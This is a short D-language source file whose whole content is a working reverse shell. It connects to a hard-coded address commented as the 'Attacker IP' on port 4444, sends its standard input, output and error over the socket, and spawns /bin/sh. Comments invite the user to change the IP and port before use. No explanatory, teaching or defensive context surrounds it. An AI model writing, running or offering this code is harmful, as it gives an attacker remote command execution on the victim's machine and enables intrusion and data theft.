import core.sys.posix.unistd;
import core.sys.posix.sys.socket;
import core.sys.posix.netinet.in_;
import core.sys.posix.arpa.inet;
import core.stdc.string;
import std.string : toStringz;

void main()
{
    // === Change these ===
    string ip   = "192.168.0.58";   // Attacker IP
    ushort port = 4444;              // Attacker port
    // ====================

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
        return;

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.toStringz, &addr.sin_addr);

    if (connect(sock, cast(sockaddr*)&addr, addr.sizeof) < 0)
    {
        close(sock);
        return;
    }

    // Redirect stdin, stdout, stderr to the socket
    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    // Spawn a shell
    execl("/bin/sh", "sh", null);
}